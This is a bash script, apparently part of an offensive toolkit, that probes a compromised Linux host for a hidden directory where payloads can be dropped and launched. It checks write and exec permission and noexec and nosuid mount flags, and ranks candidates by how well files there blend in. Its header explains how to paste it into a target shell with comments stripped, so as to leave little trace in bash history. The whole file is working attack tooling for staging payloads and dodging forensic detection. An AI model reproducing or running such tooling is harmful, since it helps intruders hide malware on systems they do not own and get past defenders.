#!/bin/bash
# drop_dir_probe.sh — Identify a stealth drop dir (write+exec, optionally suid-honor).
# Used by drop-and-launch technique playbooks via [[Stealth Drop Dir Probe]].
#
# Usage (target deployment via xclip-heredoc with comment-strip — minimises
# forensic content in target bash history):
#   (echo "bash -s <<'EOF'";      sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/drop_dir_probe.sh; echo "EOF") | xclip -selection clipboard
#   (echo "bash -s suid <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/drop_dir_probe.sh; echo "EOF") | xclip -selection clipboard
# Paste into target shell.
#
# Candidates probed (stealth-first):
#   /run/user/$(id -u)  — tmpfs, owner-only (best stealth when usable + suid-honored)
#   /dev/shm            — tmpfs, world-writable (usually nosuid on hardened distros)
#   /run/lock           — tmpfs, world-writable (usually noexec+nosuid on hardened)
#   $HOME/.cache        — persistent, app-blend, owner-only (high filename blending)
#   $HOME/.config       — persistent, app-blend, owner-only (high filename blending)
#   /var/tmp            — persistent, world-writable
#   $HOME               — persistent, owner-only
#
# First candidate that passes required checks → "DROP OK: <path>" on stdout, exit 0.
# Nothing matched → exit 1.
#
# Operation is read-only (stat + /proc/mounts read). No file writes, no setuid
# creation. Zero filesystem IOC from the probe itself.

set -u
mode=${1:-}

case "$mode" in
  ""|suid) ;;
  *) echo "Usage: $0 [suid]" >&2; exit 2 ;;
esac

[ -r /proc/mounts ] || { echo "/proc/mounts not readable" >&2; exit 1; }

for d in \
  "/run/user/$(id -u)" \
  /dev/shm \
  /run/lock \
  "$HOME/.cache" \
  "$HOME/.config" \
  /var/tmp \
  "$HOME"
do
  [ -d "$d" ] && [ -w "$d" ] && [ -x "$d" ] || continue

  # Find longest-matching mountpoint in /proc/mounts (handles inheritance).
  # Root mount $2="/" handled distinctly so it doesn't become "//" which would
  # never prefix-match any path. `>= L` ensures later bind mounts on the same
  # mountpoint override earlier same-length entries (kernel resolution order).
  opts=$(awk -v p="$d/" '
    {
      m = ($2 == "/") ? "/" : $2 "/"
      if (index(p, m) == 1 && length(m) >= L) {
        L = length(m)
        o = $4
      }
    }
    END { print o }
  ' /proc/mounts)

  [ -n "$opts" ] || continue

  echo "$opts" | grep -qw noexec && continue

  if [ "$mode" = "suid" ]; then
    echo "$opts" | grep -qw nosuid && continue
  fi

  echo "DROP OK: $d"
  exit 0
done

exit 1
